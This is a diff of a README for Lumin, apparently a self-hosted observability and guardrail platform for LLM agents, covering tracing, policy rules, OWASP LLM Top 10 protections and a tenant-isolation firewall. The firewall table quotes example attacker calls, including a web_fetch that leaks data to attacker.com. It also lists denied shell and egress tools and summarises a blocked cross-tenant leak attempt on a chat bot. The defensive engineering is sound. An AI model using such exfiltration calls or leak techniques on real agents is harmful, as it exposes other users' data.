@@ -1,20 +1,20 @@
 <p align="center">
-   <img src="assets/lumin-banner.svg" alt="Lumin — local-first agent observability + tenant-isolation firewall" width="100%" />
+   <img src="assets/lumin-banner.svg" alt="Lumin — local-first observability + security for LLM agents" width="100%" />
 </p>
 
 <div align="center">
    <h3>
       <a href="#-quickstart">
-         <strong>Self-Host in 60 seconds</strong>
+         <strong>Quickstart</strong>
       </a> ·
-      <a href="#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle">
-         <strong>Tenant Firewall</strong>
+      <a href="#%EF%B8%8F-four-pillars--observe-govern-defend-operate">
+         <strong>Four Pillars</strong>
       </a> ·
       <a href="#-integrations">
          <strong>Integrations</strong>
       </a> ·
-      <a href="https://github.com/amitbidlan/zistica-lumin/issues/new">
-         <strong>Report Bug</strong>
+      <a href="#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime">
+         <strong>OWASP Guardrails</strong>
       </a> ·
       <a href="https://github.com/amitbidlan/zistica-lumin/discussions">
          <strong>Discussions</strong>
@@ -50,73 +50,116 @@
 </p>
 
 <p align="center">
-   Open-source. Self-hosted in a single Docker container. No cloud, no telemetry, no vendor lock-in.
+   <strong>The open-source operational platform for LLM agents in production.</strong><br/>
+   Observe every trace · govern with policies · defend with OWASP LLM Top 10 guardrails · operate with audit, alerts, and approvals.<br/>
+   Works with every major framework. Single self-hosted Docker container. No cloud, no telemetry, no vendor lock-in.
 </p>
 
-<!-- Demo video hosted on YouTube — clickable thumbnail uses the
-     repo-local poster so the README never depends on YouTube's CDN
-     for the still frame. Click → opens https://youtu.be/hgTntZniuv4 -->
+<!-- Animated GIF preview, click → full 52s video on YouTube.
+     GIF is 1000px/10fps/128-color palette to stay under 7MB —
+     small enough for the README to load fast, readable enough for
+     the dashboard panels and trace IDs to be legible. -->
 <p align="center">
    <a href="https://youtu.be/hgTntZniuv4">
-      <img alt="▶ Lumin demo — 52-second walkthrough (click to watch on YouTube)"
-           src="assets/demo-poster.jpg" width="100%">
+      <img alt="▶ Lumin demo — 52-second walkthrough (click to watch full on YouTube)"
+           src="assets/demo.gif" width="100%">
    </a>
 </p>
 <p align="center">
-   <sub>▶ <a href="https://youtu.be/hgTntZniuv4">Watch on YouTube</a> — 52-second walkthrough — Telegram user plants customer notes, Slack user tries to leak them, Lumin's 5 layers block every bypass route.</sub>
+   <sub>▶ <a href="https://youtu.be/hgTntZniuv4">Watch the full 52-second walkthrough on YouTube</a> — instrumenting an agent, inspecting a trace, promoting a shadow policy, and watching the firewall block a live cross-session leak.</sub>
 </p>
 
 ---
 
-## ✨ Core Features
+## 🏛️ Four Pillars · Observe, Govern, Defend, Operate
 
-- **🔍 Agent observability** — instrument any Python or TypeScript agent in 2 lines. Captures every LLM call, tool invocation, retrieval, embedding, and custom span. Real-time WebSocket push to the dashboard, no refresh.
+Most LLM tooling picks one corner of the agent operations problem. Lumin covers all four — in one self-hosted Docker container, across every major framework.
 
-- **🛡️ [Tenant-isolation firewall](#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle)** — five layers of structural defense for multi-user bots (Slack, Telegram, Discord, internal SaaS). Per-user file sandbox, deny-by-default for shells / network egress, conversation-history reset on sender switch, Presidio-powered prompt redaction, full audit trail. **Stops cross-session leaks structurally — not with a regex.**
+### 🔍 Observe
 
-- **⚙️ [One-knob security profiles](#3%EF%B8%8F⃣-1%EF%B8%8F⃣-configure-your-agents-plugin)** — pick `strict`, `standard`, `light`, or `logging-only`. Each profile sets sensible defaults across all five layers. Override individual toggles via dashboard UI without touching config files.
-
-- **📊 [Policy engine](packages/api/firewall/)** — DB-backed rules that fire on every span/trace ingest: cost runaways, prompt-injection patterns, PII in output, runaway loops. Per-agent scoping. Full audit log. Server-side enforcement so SDK and integrations get identical behavior.
-
+- **[Universal tracing](packages/sdk-python/lumin/integrations/)** — 16 first-class integrations (Python SDK, TypeScript SDK, LangChain, LangGraph, LlamaIndex, CrewAI, AutoGen, LiteLLM, OpenAI Agents, Pydantic AI, Anthropic, Mastra, VoltAgent, OpenClaw, OpenAI-compat proxy, OTLP receiver). Instrument any agent in 2 lines or zero with the proxy.
+- **Full span tree** — every LLM call, tool invocation, retrieval, embedding, custom span. Anthropic extended-thinking blocks captured as first-class child spans.
 - **💬 [Multi-turn sessions](packages/dashboard/app/sessions/)** — group related traces under a single conversation. Aggregate cost, duration, and quality across turns.
+- **💰 Cost & token attribution** — per-call breakdown for OpenAI, Anthropic, Ollama, and extended-thinking tokens.
+- **🌊 [Real-time stream](packages/dashboard/lib/websocket.ts)** — WebSocket fanout pushes new traces and spans to the dashboard the instant they're ingested.
+- **[Evals & scoring](packages/api/routers/evals.py)** — run evaluators against traces, attach scores, compare versions over time.
 
-- **💰 Cost & token tracking** — automatic per-call breakdown for OpenAI, Anthropic, Ollama, and Anthropic extended-thinking blocks (counted as separate spans).
+### 📜 Govern
 
-- **🌊 [Real-time stream](packages/dashboard/lib/websocket.ts)** — WebSocket fanout pushes new traces and spans to the dashboard the instant they're ingested. Falls back to 5-second polling when the socket can't connect.
+- **[Policy engine](packages/api/firewall/)** — DB-backed rules with a typed DSL (`before_proxy_call` / `after_proxy_call` lifecycle, priority, severity, conditions like `prompt_guard_score(...)`, `has_image_markdown_exfil(...)`, `vault_match(...)`, `cost_in_window(...)`).
+- **[12 starter policy packs](packages/api/firewall/starter_packs/)** — ship pre-built: OWASP LLM Top 10, OWASP Agentic 2025, GDPR, HIPAA, PCI-DSS, cost guards, cross-session isolation, customer support, code assistant, dev environment safety, framework-specific (LangGraph, Mastra). Auto-installed in `shadow` mode on first boot; promote rules one at a time.
+- **[Shadow / enforce modes](packages/api/firewall/decide.py)** — every rule starts as `shadow` (records what it would have done). Promote to `enforce` after reviewing the dashboard timeline.
+- **Versioning, rollback, audit** — every policy edit recorded; one-click rollback to any prior version.
+- **[Policy suggester](packages/api/firewall/suggester.py)** — mines patterns from your real traces and proposes rules. Dashboard shows accept / dismiss / promote.
+- **[Replay](packages/api/firewall/replay.py)** — test a draft policy against historical traces before promoting it. Get the would-block / would-allow counts.
+- **[Drift detection](packages/api/firewall/drift.py)** — alerts when prompt-injection scores, PII rates, or tool-call shapes shift outside the training distribution.
+- **[Approvals queue](packages/dashboard/app/approvals/)** & **[decisions audit](packages/dashboard/app/decisions/)** — human-in-the-loop for the rules that opt in.
 
-- **🛟 [Resilient by design](packages/sdk-python/lumin/exporter.py)** — your agent never fails because Lumin is down. Spans drop silently if the queue overflows, the exporter is unreachable, or the server returns 5xx. Rule 7 of the spec: **a Lumin outage MUST never affect the agent**.
+### 🛡️ Defend — [OWASP LLM Top 10 at runtime](#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime)
 
-- **🏠 Local-first** — single Docker image, DuckDB + SQLite, no external services, no cloud dependency. Runs on a laptop or a 2-vCPU VPS.
+- **8 detection methods** layered: Presidio NER (PII), Prompt Guard 2 (22M-param injection classifier), Llama Guard 4 (14 MLCommons hazard categories), LLM-judge, embedding similarity, indirect-prompt-injection detection, locally-trainable classifier (per-corpus retraining), regex packs.
+- **[Tenant-isolation firewall](#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime)** — 5-layer structural defense for multi-tenant bots (per-user file sandbox, deny shells & egress, conversation-history reset, prompt redaction, audit). One layer of the Defend pillar; deep dive below.
+- **[Attack generator](packages/api/firewall/attack_generator.py)** — synthesizes adversarial test cases per OWASP category for CI testing.
+- **[PII vault](packages/api/firewall/vault.py)** + **foreign-tenant excerpts** — server-side store of known sensitive strings; cross-checked at every span ingest.
+- **[Panic disable](packages/api/firewall/__init__.py)** — emergency kill-switch for all firewall enforcement (with banner + audit).
 
-## 🛡️ The Tenant-Isolation Firewall — Lumin's Unique Angle
+### 🛠️ Operate
 
-Most LLM observability tools tell you what your bot did *after* it did it. They don't stop one customer's data from leaking into another customer's chat. **Lumin does.**
+- **[Webhook fanout](packages/api/firewall/webhooks.py)** — every block, redaction, or policy hit fires to PagerDuty, Slack, SIEM endpoints. Retry + dead-letter built in.
+- **[Backups + retention](packages/api/routers/admin.py)** — scheduled DuckDB snapshots, configurable retention windows, one-click restore.
+- **Metrics + health** — Prometheus-shape `/v1/admin/metrics`, liveness + readiness endpoints.
+- **🛟 [Resilient by design](packages/sdk-python/lumin/exporter.py)** — your agent never fails because Lumin is down. Spans drop silently if the queue overflows, the exporter is unreachable, or the server returns 5xx. **A Lumin outage MUST never affect the agent.**
+- **🏠 Local-first** — single Docker image, DuckDB + SQLite, no external services. Runs on a laptop or a 2-vCPU VPS.
 
-The five-layer defense:
+## 🛡️ OWASP LLM Top 10 Guardrails — at runtime
+
+This is the **Defend** pillar in depth — one of Lumin's four pillars. The Observe, Govern, and Operate pillars cover everything around it (tracing every span, authoring + rolling back policies, audit + alerts).
+
+Most other LLM tools cover only one corner: **observability** stacks (Langfuse, LangSmith, Helicone, Arize) record what your agent did *after* it did it; **guardrail classifiers** (Lakera, NemoGuardrails) score single prompts in isolation. Lumin does both, plus the policy lifecycle around them.
+
+Every span ingested is recorded *and* scored against runtime OWASP LLM Top 10 protections:
+
+| OWASP risk | Lumin protection |
+|---|---|
+| **LLM01 — Prompt Injection** | Pattern + LLM-judge detection on every input. Blocks or flags before the prompt reaches the model. |
+| **LLM02 / LLM06 — Sensitive Info Disclosure** | Microsoft Presidio NER scrubs PII, names, orgs, IDs, emails, phones, SSNs, credit cards, passports from prompts and history (configurable confidence threshold). |
+| **LLM03 — Supply-Chain** | Every tool call audited with a tamper-evident trail. Tool allowlist + plugin manifest signing. |
+| **LLM05 — Insecure Output Handling** | Output-filter chain (regex + structural) before responses leave the agent. Blocks PII echo-back and exfiltration patterns. |
+| **LLM08 — Excessive Agency** | Deny-by-default for shells (`exec`, `bash`, `python`, `ruby`, …) and network egress (`web_fetch`, `curl`, `http_*`). Per-user file sandbox. |
+| **LLM09 — Overreliance** | Policy engine with declarative rules + human approval queue. Anything outside the rules pauses until a human signs off. |
+| **LLM10 — Model Theft / Cross-tenant Exfiltration** | Tenant-isolation firewall: conversation-history reset on sender switch, structural blocking of cross-session leaks in multi-tenant bots. |
+
+### The tenant-isolation layer in detail
+
+LLM08 + LLM10 together cover a problem most guardrail classifiers miss: in a multi-tenant Slack / Telegram / Discord / SaaS bot, one customer's data leaking into another customer's chat. Lumin's tenant firewall stacks five structural layers:
 
 | Layer | What it does |
 |---|---|
 | **L1 storage sandbox** | Every fs tool call (`read`, `write`, `edit`, `grep`, `cat`, `head`, `tail`, …) gets its `path` parameter rewritten to `${workspace}/_lumin/by-sender/<sender>/`. The bot literally has no path to another tenant's data. |
 | **L1.5 deny shell + egress** | Tools that bypass file paths — `exec`, `shell`, `bash`, `python`, `web_fetch`, `http_get`, `curl` — refused by default. An attacker can't `exec("cat ../alice/secret")` or `web_fetch("https://attacker.com?leak=...")`. |
 | **L2 conversation history reset** | When the active sender changes for a shared agent, the LLM's message history is wiped before it sees the next turn. Foreign-tenant text never enters context. |
-| **L3 input redaction** | Every prompt + history scanned by Presidio NER (names, emails, locations, organizations) + structural ID regexes + foreign-vault excerpts before the LLM call. Replaced with `[REDACTED]`. |
-| **L4 audit trail** | Every block, redaction, and sandbox rewrite generates a row in `policy_violations` queryable from the dashboard `/violations` page. Webhooks fire to PagerDuty / Slack / SIEM. |
+| **L3 input redaction** | Every prompt + history scanned by Presidio NER + structural ID regexes + foreign-vault excerpts before the LLM call. Replaced with `[REDACTED]`. |
+| **L4 audit trail** | Every block, redaction, and sandbox rewrite recorded in `policy_violations`. Webhooks fire to PagerDuty / Slack / SIEM. |
 
 **Verified live**: a real Telegram → Slack leak attempt with the `standard` profile blocked all 5+ bypass routes (3 `exec` calls denied, 2 `read` calls sandboxed to empty per-sender dir, 97 prior-tenant messages cleared from history, foreign-vault entries redacted from the prompt). The bot's reply contained zero foreign-tenant data. See the demo video above.
 
-Compare to other tools:
+### How Lumin compares
 
 | | Lumin | Langfuse | Lakera | NemoGuard |
 |---|---|---|---|---|
-| **Tracing/spans/evals** | ✅ | ✅ | ❌ | ❌ |
-| **Per-user file sandbox** | ✅ structural | ❌ | ❌ | ❌ |
-| **Conversation history isolation** | ✅ structural | ❌ | ❌ | ❌ |
-| **PII redaction in prompt** | ✅ Presidio | ❌ | ✅ classifier | ✅ classifier |
-| **Deny-by-default for exec/web_fetch** | ✅ | ❌ | ❌ | ❌ |
+| **Full-trace observability** | ✅ | ✅ | ❌ | ❌ |
+| **Cost + token attribution** | ✅ | ✅ | ❌ | ❌ |
+| **Evals + scoring** | ✅ | ✅ | ❌ | ❌ |
+| **Prompt-injection detection (LLM01)** | ✅ | ❌ | ✅ | ✅ |
+| **PII redaction in prompt (LLM02/LLM06)** | ✅ Presidio | ❌ | ✅ classifier | ✅ classifier |
+| **Excessive-agency guard (LLM08)** | ✅ deny exec/fetch | ❌ | ❌ | ❌ |
+| **Per-user file sandbox (LLM10)** | ✅ structural | ❌ | ❌ | ❌ |
+| **Conversation history isolation (LLM10)** | ✅ structural | ❌ | ❌ | ❌ |
+| **Policy engine + approval queue** | ✅ | ❌ | ❌ | ⚠️ partial |
 | **Self-hosted single Docker** | ✅ | ⚠️ ClickHouse + Postgres + Redis + S3 | ❌ SaaS | ❌ NIM endpoint |
-| **Open source (Apache-2.0)** | ✅ | ✅ MIT | ❌ | ✅ Apache-2.0 |
+| **Open source** | ✅ Apache-2.0 | ✅ MIT | ❌ | ✅ Apache-2.0 |
 
-Lumin replaces Langfuse for one specific job: **keeping multi-tenant bots safe**. For everything else, Lumin and Langfuse can co-exist (different layers).
+Lumin and Langfuse can coexist — Lumin adds the security layer on top of any observability stack. For teams who want a single container instead of a stack, Lumin alone covers both jobs.
 
 ---
 
@@ -166,9 +209,14 @@ docker compose build --build-arg LUMIN_PRESIDIO_MODEL=en_core_web_md
 | [Python SDK](packages/sdk-python/) | `pip install -e .` | `@lumin.trace` decorator, `lumin.span()` context manager, sessions, policy engine, framework integrations |
 | [TypeScript SDK](packages/sdk-typescript/) | `@lumin-io/sdk` | Wire-format peer of the Python SDK; identical behavior |
 | [LangChain](packages/sdk-python/lumin/integrations/langchain.py) | Python, callback handler | Zero-config via `LUMIN_TRACING=true` — every chain auto-traced |
+| [LangGraph](packages/sdk-python/lumin/integrations/langgraph_firewall.py) | Python | Graph nodes/edges traced; firewall hooks on every node call |
 | [LlamaIndex](packages/sdk-python/lumin/integrations/llama_index.py) | Python, callback manager | RAG retrievers, embeddings, query engines, agents |
 | [CrewAI](packages/sdk-python/lumin/integrations/crewai.py) | Python | Multi-agent crews — kickoff → agent → tasks tree |
-| [Anthropic](packages/sdk-python/lumin/integrations/anthropic.py) | Python | Extended-thinking blocks captured as first-class child spans |
+| [AutoGen](packages/sdk-python/lumin/integrations/autogen_firewall.py) | Python | Multi-agent conversations + firewall enforcement per message |
+| [LiteLLM](packages/sdk-python/lumin/integrations/litellm_firewall.py) | Python | 100+ providers via LiteLLM router; firewall on every call |
+| [OpenAI Agents](packages/sdk-python/lumin/integrations/openai_agents_firewall.py) | Python | OpenAI's `agents` SDK — guard handoffs, tool calls, sub-agents |
+| [Pydantic AI](packages/sdk-python/lumin/integrations/pydantic_ai_firewall.py) | Python | Typed agent framework; firewall on tool calls + structured outputs |
+| [Anthropic](packages/sdk-python/lumin/integrations/anthropic.py) | Python + TypeScript | Extended-thinking blocks captured as first-class child spans |
 | [OpenAI compat](packages/api/routers/proxy.py) | HTTP proxy | Point any OpenAI / Ollama / Anthropic-compat client at `:8000/v1/openai` — auto-instruments without code changes |
 | [Mastra](packages/integrations/mastra/) | `@lumin-io/mastra` | TypeScript agent framework — drop-in replacement for `@mastra/langfuse` |
 | [VoltAgent](packages/integrations/voltagent/) | `@lumin-io/voltagent` | OTel-native exporter |
@@ -176,7 +224,7 @@ docker compose build --build-arg LUMIN_PRESIDIO_MODEL=en_core_web_md
 | [OpenClaw — full content](packages/integrations/openclaw-diagnostics/) | `@lumin-io/openclaw-diagnostics` | Typed-hook plugin: prompts, replies, thinking, **+ the full firewall** |
 | [OTel / OTLP](packages/api/routers/otlp.py) | endpoint | `POST /v1/otlp/v1/traces` — receives from any OTel-instrumented agent |
 
-Compatible with anything that speaks OpenTelemetry (Logfire, Phoenix, Datadog GenAI, OpenLLMetry, …).
+Compatible with anything that speaks OpenTelemetry (Logfire, Phoenix, Datadog GenAI, OpenLLMetry, …). **If your framework isn't here, the OTLP receiver covers it.**
 
 ---
 
@@ -447,6 +495,9 @@ Streaming and non-streaming both work. Pass W3C `traceparent` header for span st
 ## 📖 Where things live
 
 - **[Quickstart](#-quickstart)** — start Lumin, trace your first call, open the dashboard
+- **[Four Pillars](#%EF%B8%8F-four-pillars--observe-govern-defend-operate)** — Observe, Govern, Defend, Operate at a glance
+- **[OWASP LLM Top 10 guardrails](#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime)** — the Defend pillar in depth (8 detectors, starter packs, tenant isolation)
+- **[Integrations](#-integrations)** — 16 first-party + OTLP for everything else
 - **[Add the firewall](#%EF%B8%8F-add-the-firewall-multi-user-bots)** — turn on tenant isolation in three steps
 - **[Architecture](#%EF%B8%8F-architecture)** — single Docker container, FastAPI + Next.js + DuckDB
 - **[Packages](#-packages)** — every component with test counts
@@ -472,8 +523,8 @@ You can use Lumin free for any purpose — commercial, internal, hosted as a ser
 ---
 
 <p align="center">
-   <strong>Lumin replaces Langfuse for one specific job: keeping multi-tenant AI bots safe.</strong><br/>
-   For everything else, they co-exist. Different layers.
+   <strong>Observe · Govern · Defend · Operate — one Docker container, every framework.</strong><br/>
+   Local-first, Apache-2.0, no telemetry. Your traces never leave your machine.
 </p>
 
 <p align="center">
